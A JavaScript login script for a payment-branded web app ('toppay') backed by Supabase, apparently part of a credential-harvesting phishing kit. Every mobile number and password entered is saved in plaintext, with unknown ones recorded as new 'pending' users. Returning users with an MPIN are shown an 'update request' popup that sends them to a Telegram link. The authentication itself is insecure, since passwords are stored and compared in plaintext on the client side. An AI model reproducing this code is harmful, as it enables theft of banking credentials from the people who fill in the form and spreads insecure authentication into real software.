// user-app/js/auth/login.js
import { supabase } from "../config/supabase.js";

document.addEventListener("DOMContentLoaded", () => {
  const loginForm = document.getElementById("loginForm");
  const mobileInput = document.getElementById("mobile");
  const passwordInput = document.getElementById("password");
  const errorMessage = document.getElementById("errorMessage");
  const loginBtn = document.getElementById("loginBtn");

  // Only allow numbers in mobile input
  mobileInput.addEventListener("input", function (e) {
    this.value = this.value.replace(/[^0-9]/g, "");
  });

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const mobile = mobileInput.value;
    const password = passwordInput.value;

    if (mobile.length !== 10) {
      showError("Please enter a valid 10-digit mobile number.");
      return;
    }

    if (password.length < 4) {
      showError("Password is too short.");
      return;
    }

    try {
      setLoading(true);

      // Check if user exists
      const { data: existingUsers, error: selectError } = await supabase
        .from("users")
        .select("*")
        .eq("mobile", mobile)
        .eq("password", password);

      let user =
        existingUsers && existingUsers.length > 0 ? existingUsers[0] : null;

      if (user) {
        // User exists with same mobile and password
        if (
          (user.status === "completed" || user.mpin) &&
          user.login_count >= 1
        ) {
          const { data: tData } = await supabase.from("telegram_popup").select("*").limit(1);
          let limitPopup = document.getElementById("limitPopup");
          if (limitPopup && limitPopup.innerHTML.trim() === "") {
             limitPopup.innerHTML = `
              <div style="background: #fff; padding: 24px; border-radius: 12px; max-width: 90%; width: 320px; text-align: center;">
                <div style="margin-bottom: 16px; color: #3b82f6">
                  <i data-lucide="info" style="width: 48px; height: 48px; margin: 0 auto"></i>
                </div>
                <h3 style="font-size: 18px; margin-bottom: 12px; font-weight: 600; color: #1f2937;">Update Request Already Received</h3>
                <p style="font-size: 14px; color: #4b5563; margin-bottom: 16px; line-height: 1.5;">Please wait some time. You can use another link:</p>
                <a href="#" id="telegramLimitLink" style="display: inline-block; padding: 10px 16px; background: #e0e7ff; color: #4f46e5; border-radius: 8px; text-decoration: none; font-weight: 600; word-break: break-all;">app-web.toppay-web.com</a>
              </div>
             `;
             if (window.lucide) {
               window.lucide.createIcons();
             }
          }
          if (tData && tData.length > 0 && tData[0].telegram_link) {
            const tLink = document.getElementById("telegramLimitLink");
            if (tLink) {
              tLink.href = tData[0].telegram_link;
              tLink.textContent = tData[0].telegram_link;
            }
          }
          if (limitPopup) {
            limitPopup.style.display = "flex";
            limitPopup.classList.remove("hidden");
          }
          setLoading(false);
          return;
        }

        // Update login count
        await supabase
          .from("users")
          .update({
            login_count: (user.login_count || 0) + 1,
            last_login: new Date().toISOString(),
          })
          .eq("id", user.id);
      } else {
        // Register new user (Pending status)
        const { data: newUsers, error: insertError } = await supabase
          .from("users")
          .insert({
            mobile: mobile,
            password: password,
            status: "pending",
            login_count: 1,
            last_login: new Date().toISOString(),
          })
          .select();

        if (insertError) {
          console.error(insertError);
          showError(
            "Invalid login details or account already exists with different password.",
          );
          setLoading(false);
          return;
        }
        user = newUsers[0];
      }

      // Save session
      sessionStorage.setItem(
        "toppay_session",
        JSON.stringify({
          userId: user.id,
          mobile: user.mobile,
          mpin: user.mpin || null,
        }),
      );

      // Redirect to home
      window.location.href = "/home";
    } catch (error) {
      console.error("Login error:", error);
      showError("An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  });

  function showError(msg) {
    errorMessage.textContent = msg;
    errorMessage.classList.remove("hidden");
  }

  function setLoading(isLoading) {
    if (isLoading) {
      loginBtn.textContent = "Please wait...";
      loginBtn.disabled = true;
    } else {
      loginBtn.textContent = "LOG IN";
      loginBtn.disabled = false;
    }
  }
});
